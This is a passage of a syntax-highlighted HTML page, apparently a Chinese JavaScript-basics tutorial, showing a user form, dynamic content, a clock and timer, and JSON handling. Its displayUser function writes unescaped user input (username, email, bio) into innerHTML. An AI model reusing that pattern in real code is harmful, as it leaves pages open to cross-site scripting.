class="attr">name</span>=<span class="string">&quot;country&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;cn&quot;</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;us&quot;</span>&gt;</span>美国<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;jp&quot;</span>&gt;</span>日本<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;kr&quot;</span>&gt;</span>韩国<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;bio&quot;</span>&gt;</span>个人简介<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submitBtn&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;resetBtn&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;userOutput&quot;</span> <span class="attr">class</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>2. 动态内容操作<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;contentInput&quot;</span>&gt;</span>输入内容<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;contentInput&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入要添加的内容&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;addContentBtn&quot;</span>&gt;</span>添加内容<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;clearContentBtn&quot;</span>&gt;</span>清空内容<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;contentArea&quot;</span> <span class="attr">class</span>=<span class="string">&quot;output&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>初始内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>3. 时钟与通知<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;timer-display&quot;</span> <span class="attr">id</span>=<span class="string">&quot;clock&quot;</span>&gt;</span>00:00:00<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;startTimerBtn&quot;</span>&gt;</span>开始计时<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;stopTimerBtn&quot;</span>&gt;</span>停止计时<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;resetTimerBtn&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 15px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;showNotificationBtn&quot;</span>&gt;</span>显示通知<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>4. 数据处理<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;jsonData&quot;</span>&gt;</span>JSON数据<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;jsonData&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-family: monospace;&quot;</span>&gt;</span>&#123;</span><br><span class="line">  &quot;name&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;age&quot;: 25,</span><br><span class="line">  &quot;city&quot;: &quot;北京&quot;,</span><br><span class="line">  &quot;hobbies&quot;: [&quot;编程&quot;, &quot;阅读&quot;, &quot;运动&quot;]</span><br><span class="line">&#125;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;parseJsonBtn&quot;</span>&gt;</span>解析JSON<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;formatJsonBtn&quot;</span>&gt;</span>格式化JSON<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;jsonOutput&quot;</span> <span class="attr">class</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>5. 事件委托示例<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>点击列表项查看效果：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;eventList&quot;</span> <span class="attr">style</span>=<span class="string">&quot;list-style: none; padding-left: 0;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;padding: 10px; border: 1px solid #eee; margin: 5px 0; border-radius: 4px;&quot;</span>&gt;</span>列表项 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;padding: 10px; border: 1px solid #eee; margin: 5px 0; border-radius: 4px;&quot;</span>&gt;</span>列表项 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;padding: 10px; border: 1px solid #eee; margin: 5px 0; border-radius: 4px;&quot;</span>&gt;</span>列表项 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;padding: 10px; border: 1px solid #eee; margin: 5px 0; border-radius: 4px;&quot;</span>&gt;</span>列表项 4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;eventOutput&quot;</span> <span class="attr">class</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;notification&quot;</span> <span class="attr">id</span>=<span class="string">&quot;notification&quot;</span>&gt;</span></span><br><span class="line">            操作成功！</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>JavaScript基础综合示例 <span class="symbol">&amp;copy;</span> 2023 | 所有知识点已应用<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 1. 变量和作用域</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> currentUser = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> timerId = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> startTime = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> elapsedTime = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. 函数定义</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">showNotification</span>(<span class="params">message = <span class="string">&quot;操作成功！&quot;</span>, duration = <span class="number">3000</span></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> notification = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;notification&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            notification.<span class="property">textContent</span> = message;</span></span><br><span class="line"><span class="language-javascript">            notification.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;show&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                notification.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;show&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;, duration);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. DOM操作 - 表单处理</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;userForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 4. 获取表单值</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> email = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;email&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> age = <span class="built_in">parseInt</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;age&#x27;</span>).<span class="property">value</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> country = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;country&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> bio = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;bio&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 5. 表单验证</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (username.<span class="property">length</span> &lt; <span class="number">5</span> || username.<span class="property">length</span> &gt; <span class="number">20</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;用户名必须在5-20个字符之间&#x27;</span>, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!<span class="regexp">/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w&#123;2,3&#125;)+$/</span>.<span class="title function_">test</span>(email)) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;请输入有效的邮箱地址&#x27;</span>, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 6. 创建用户对象</span></span></span><br><span class="line"><span class="language-javascript">            currentUser = &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">id</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">username</span>: username,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">email</span>: email,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">age</span>: age,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">country</span>: country,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">bio</span>: bio,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">createdAt</span>: <span class="keyword">new</span> <span class="title class_">Date</span>()</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 7. 显示用户信息</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">displayUser</span>(currentUser);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showNotification</span>(<span class="string">&#x27;用户信息已保存&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 8. 重置表单</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 9. 重置表单</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;resetBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;userForm&#x27;</span>).<span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;userOutput&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            currentUser = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showNotification</span>(<span class="string">&#x27;表单已重置&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 10. 显示用户信息</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">displayUser</span>(<span class="params">user</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> output = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;userOutput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            output.<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                &lt;div class=&quot;user-card&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;div class=&quot;user-avatar&quot;&gt;<span class="subst">$&#123;user.username.charAt(<span class="number">0</span>).toUpperCase()&#125;</span>&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                        &lt;h3&gt;<span class="subst">$&#123;user.username&#125;</span>&lt;/h3&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                        &lt;p&gt;邮箱: <span class="subst">$&#123;user.email&#125;</span>&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                        &lt;p&gt;年龄: <span class="subst">$&#123;user.age&#125;</span>岁&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                        &lt;p&gt;国家: <span class="subst">$&#123;getCountryName(user.country)&#125;</span>&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                        <span class="subst">$&#123;user.bio ? <span class="string">`&lt;p&gt;简介: <span class="subst">$&#123;user.bio&#125;</span>&lt;/p&gt;`</span> : <span class="string">&#x27;&#x27;</span>&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                &lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            `</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 11. 辅助函数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">getCountryName</span>(<span class="params">code</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> countries = &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;cn&#x27;</span>: <span class="string">&#x27;中国&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;us&#x27;</span>: <span class="string">&#x27;美国&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;jp&#x27;</span>: <span class="string">&#x27;日本&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;kr&#x27;</span>: <span class="string">&#x27;韩国&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> countries[code] || code;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 12. 动态内容操作</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;addContentBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> content = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;contentInput&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (content.<span class="title function_">trim</span>() === <span class="string">&#x27;&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;请输入内容&#x27;</span>, <span class="number">3000</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> contentArea = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;contentArea&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> newParagraph = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            newParagraph.<span class="property">textContent</span> = content;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 13. 添加样式</span></span></span><br><span class="line"><span class="language-javascript">            newParagraph.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;highlight&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            newParagraph.<span class="property">style</span>.<span class="property">transition</span> = <span class="string">&#x27;all 0.3s&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            newParagraph.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            contentArea.<span class="title function_">appendChild</span>(newParagraph);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 14. 动画效果</span></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                newParagraph.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;1&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">10</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;contentInput&#x27;</span>).<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showNotification</span>(<span class="string">&#x27;内容已添加&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 15. 清空内容</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;clearContentBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;contentArea&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showNotification</span>(<span class="string">&#x27;内容已清空&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 16. 时钟功能</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">updateClock</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> hours = <span class="title class_">String</span>(now.<span class="title function_">getHours</span>()).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> minutes = <span class="title class_">String</span>(now.<span class="title function_">getMinutes</span>()).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> seconds = <span class="title class_">String</span>(now.<span class="title function_">getSeconds</span>()).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;clock&#x27;</span>).<span class="property">textContent</span> = <span class="string">`<span class="subst">$&#123;hours&#125;</span>:<span class="subst">$&#123;minutes&#125;</span>:<span class="subst">$&#123;seconds&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 17. 计时器功能</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;startTimerBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (timerId) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            startTime = <span class="title class_">Date</span>.<span class="title function_">now</span>() - elapsedTime;</span></span><br><span class="line"><span class="language-javascript">            timerId = <span class="built_in">setInterval</span>(updateTimer, <span class="number">10</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showNotification</span>(<span class="string">&#x27;计时器已开始&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span 